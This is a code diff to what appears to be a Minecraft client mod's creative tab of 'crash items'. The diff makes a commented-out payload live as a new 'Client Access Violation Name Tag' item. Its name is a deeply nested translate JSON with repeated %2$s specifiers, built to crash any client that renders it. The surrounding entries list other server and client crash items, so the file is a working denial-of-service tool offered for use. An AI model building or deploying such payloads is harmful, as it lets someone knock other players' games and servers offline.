@@ -59,6 +59,7 @@ public class CrashItemsCreativeTab extends AbstractCreativeTab {
         items.add(withClientSide(createServerInstantCrashSculk(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Sculk")));
         items.add(withClientSide(createServerInstantCrashSign(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Instant Crash Sign")));
         items.add(withClientSide(createClientInstantCrashStone(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Stone")));
+        items.add(withClientSide(createClientAccessViolationNameTag(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Access Violation Name Tag")));
     }
 
     private static ItemStack createClientInstantCrashSkull(final String value) {
@@ -224,9 +225,10 @@ public class CrashItemsCreativeTab extends AbstractCreativeTab {
         return item;
     }
 
-    /*
-    Access Violation:
-    {"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["txsla", "txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_"]}]}]}]}]}]}]}]}
-     */
+    private static ItemStack createClientAccessViolationNameTag() {
+        final ItemStack item = new ItemStack(Items.NAME_TAG);
+        item.setCustomName(Text.Serialization.fromJson("{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\",\"with\":[\"txsla\", \"txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_\"]}]}]}]}]}]}]}]}"));
+        return item;
+    }
 
 }
